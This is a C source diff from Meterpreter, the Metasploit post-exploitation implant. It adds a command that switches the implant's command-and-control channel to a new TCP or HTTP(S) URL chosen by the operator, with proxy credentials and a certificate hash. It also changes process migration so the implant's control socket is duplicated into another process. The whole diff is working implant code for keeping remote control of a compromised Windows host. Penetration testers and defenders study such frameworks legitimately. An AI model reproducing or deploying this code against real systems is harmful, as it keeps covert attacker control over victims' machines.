@@ -59,6 +59,67 @@ typedef struct _MIGRATECONTEXT
 
 } MIGRATECONTEXT, * LPMIGRATECONTEXT;
 
+
+extern Transport* transport_create_tcp(wchar_t* url);
+extern Transport* transport_create_http(BOOL ssl, wchar_t* url, wchar_t* ua, wchar_t* proxy,
+	wchar_t* proxyUser, wchar_t* proxyPass, PBYTE certHash, int expirationTime, int commsTimeout);
+
+BOOL remote_request_core_change_transport(Remote* remote, Packet* packet, DWORD* pResult)
+{
+	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
+	Packet* response = packet_create_response(packet);
+	UINT transportType = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_TYPE);
+	wchar_t* transportUrl = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);
+
+	dprintf("[CHANGE TRANS] Type: %u", transportType);
+	dprintf("[CHANGE TRANS] Url: %S", transportUrl);
+
+	do
+	{
+		if (response == NULL || transportUrl == NULL)
+		{
+			dprintf("[CHANGE TRANS] Something was NULL");
+			break;
+		}
+
+		if (transportType == METERPRETER_TRANSPORT_SSL)
+		{
+			remote->nextTransport = transport_create_tcp(transportUrl);
+		}
+		else
+		{
+			BOOL ssl = transportType == METERPRETER_TRANSPORT_HTTPS;
+			wchar_t* ua = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_UA);
+			wchar_t* proxy = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_INFO);
+			wchar_t* proxyUser = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_USER);
+			wchar_t* proxyPass = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_PASS);
+			PBYTE certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);
+			int expirationTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
+			int commsTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMMS_TIMEOUT);
+
+			remote->nextTransport = transport_create_http(ssl, transportUrl, ua, proxy,
+				proxyUser, proxyPass, certHash, expirationTimeout, commsTimeout);
+
+			SAFE_FREE(ua);
+			SAFE_FREE(proxy);
+			SAFE_FREE(proxyUser);
+			SAFE_FREE(proxyPass);
+		}
+
+		// tell the server dispatch to exit, it should pick up the new transport
+		result = ERROR_SUCCESS;
+	} while (0);
+
+	if (packet)
+	{
+		packet_transmit_empty_response(remote, response, result);
+	}
+
+	SAFE_FREE(transportUrl);
+
+	return result == ERROR_SUCCESS ? FALSE : TRUE;
+}
+
 /*!
  * @brief Migrate the meterpreter server from the current process into another process.
  * @param remote Pointer to the \c Remote instance.
@@ -130,9 +191,10 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 			BREAK_ON_ERROR("[MIGRATE] OpenProcess failed")
 		}
 
-		if (remote->transport == METERPRETER_TRANSPORT_SSL) {
+		if (remote->transport->get_socket)
+		{
 			// Duplicate the socket for the target process if we are SSL based
-			if (WSADuplicateSocket(remote_get_fd(remote), dwProcessID, &ctx.info) != NO_ERROR)
+			if (WSADuplicateSocket(remote->transport->get_socket(remote->transport), dwProcessID, &ctx.info) != NO_ERROR)
 			{
 				BREAK_ON_WSAERROR("[MIGRATE] WSADuplicateSocket failed")
 			}
